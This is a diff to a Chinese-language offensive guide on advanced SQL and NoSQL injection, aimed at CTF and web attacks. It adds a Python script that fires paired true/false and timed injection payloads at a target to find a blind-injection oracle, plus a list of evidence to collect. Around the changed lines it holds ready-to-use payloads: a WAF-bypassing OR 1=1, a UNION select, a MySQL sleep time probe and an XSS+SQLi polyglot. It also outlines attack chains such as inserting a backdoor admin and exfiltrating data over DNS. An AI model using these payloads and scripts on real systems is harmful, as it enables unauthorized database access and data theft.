@@ -14,13 +14,13 @@ keywords: ["SQL注入", "NoSQL注入", "MongoDB注入", "WAF绕过", "盲注", "
 difficulty: "advanced"
 tags: ["injection", "sqli", "nosqli", "waf-bypass", "database", "web-security", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 
 # SQLi & NoSQLi (数据库注入高阶实战)
 
-数据库注入是 Web 安全中的经典问题，但在 CTF 和现代 Web 对抗中，我们通常需要面对**防注入过滤 (WAF)**、**无回显盲注**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略。
+数据库注入是 Web 对抗中的经典主线，但在 CTF 和现代 Web 对抗中，我们通常需要面对**过滤器/WAF**、**无回显盲注**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略。
 
 ---
 
@@ -58,6 +58,52 @@ related_articles: []
 ## 2. 无回显盲注（Blind SQLi）并发爆破
 
 对于布尔盲注 (Boolean-based) 或时间盲注 (Time-based)，单线程爆破速度慢且极易超时。本指南建议在 `scripts/` 下编写 Python 盲注脚本时，使用多线程提速。
+
+### Oracle 选择矩阵
+
+| 信号 | Boolean oracle | Time oracle | 推荐打法 |
+|---|---|---|---|
+| 页面长度稳定 | 响应长度 / hash | 不需要 | 二分 ASCII |
+| 页面有动态广告/时间 | DOM marker / JSON 字段 | 备用 | 固定字段 diff |
+| 全部无回显 | 无 | `sleep/pg_sleep/WAITFOR` | baseline p95 + 投票 |
+| WAF 拦函数名 | `LIKE/REGEXP/BETWEEN` | heavy query | 函数等价替换 |
+| GraphQL/API 包 JSON | status + JSON path | header timing | 批量 alias/变量 |
+
+```python
+# blind_oracle_picker.py — 统一真假/快慢判定
+import hashlib
+import statistics
+import time
+import requests
+
+def resp_fp(r):
+    body = r.text[:4096]
+    return {
+        "status": r.status_code,
+        "len": len(r.text),
+        "hash": hashlib.sha256(body.encode(errors="ignore")).hexdigest()[:12],
+        "jsonish": body.strip().startswith(("{", "[")),
+    }
+
+def compare_pair(url, param, true_payload, false_payload):
+    s = requests.Session()
+    rt = s.get(url, params={param: true_payload}, timeout=8)
+    rf = s.get(url, params={param: false_payload}, timeout=8)
+    ft, ff = resp_fp(rt), resp_fp(rf)
+    return {
+        "true": ft,
+        "false": ff,
+        "usable": ft["status"] != ff["status"] or abs(ft["len"] - ff["len"]) > 80 or ft["hash"] != ff["hash"],
+    }
+
+def timed_vote(url, param, payload, samples=5):
+    times = []
+    for _ in range(samples):
+        t0 = time.perf_counter()
+        requests.get(url, params={param: payload}, timeout=12)
+        times.append(time.perf_counter() - t0)
+    return statistics.median(times), times
+```
 
 ### 二分法并发爆破核心代码
 ```python
@@ -294,6 +340,7 @@ SQLi → stacked query → INSERT 后门管理员 → 持久化
 SQLi → OOB DNS → 逐字节外带 flag → 无回显完成
 NoSQLi $regex → 逐字符爆破 JWT secret → JWT 伪造 → Admin API
 SQLi → INFORMATION_SCHEMA → 发现其他应用 DB → 跨库攻击
+```
 
 ## 11. Content-Type Smuggling for SQLi (WAFFLED)
 
@@ -326,7 +373,7 @@ def content_type_smuggling_sqli(target: str, sqli_payload: str):
 -- MySQL + PostgreSQL + MSSQL 通用:
 1'/**/OR/**/1=1/**/--
 1' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c --
-0'XOR(if(now()=sysdate(),sleep(5),0))XOR'  -- MySQL SLEEP + 其他 DB 无害
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'  -- MySQL SLEEP + 其他 DB 不触发目标函数
 
 -- HTML + SQL polyglot (通过输入同时触发 XSS 和 SQLi):
 '><img src=x onerror=alert(1)>' OR '1'='1
@@ -352,7 +399,13 @@ def session_splice(requests_parts: list[str]):
 
 ## Evidence
 
-记录: 真假响应对 (布尔盲注)、快慢时间对 (时间盲注)、OOB DNS/HTTP 日志、Second-order 两步 request/response
+- `oracle_pairs.json`: True/False payload、状态码、长度、hash、marker 差异。
+- `timing_samples.csv`: payload、样本数、中位数、p95、baseline、判定阈值。
+- `tamper_matrix.csv`: 原始 payload、变体、变形层、WAF 响应、DB 执行信号。
+- `oob_logs.jsonl`: DNS/HTTP label、chunk 序号、还原后的字段值。
+- `second_order_flow.md`: 写入请求、落库形态、触发请求、报错/延迟/数据输出。
+- 成功样本: 可重复抽出 DBMS 指纹、表/列/flag；或 NoSQL 正则稳定推进前缀。
+- 失败样本: 真假响应无稳定差异、时间噪声覆盖 delay、OOB 无回连、二阶触发点不使用写入字段。
 
 ## MCP 工具映射
 
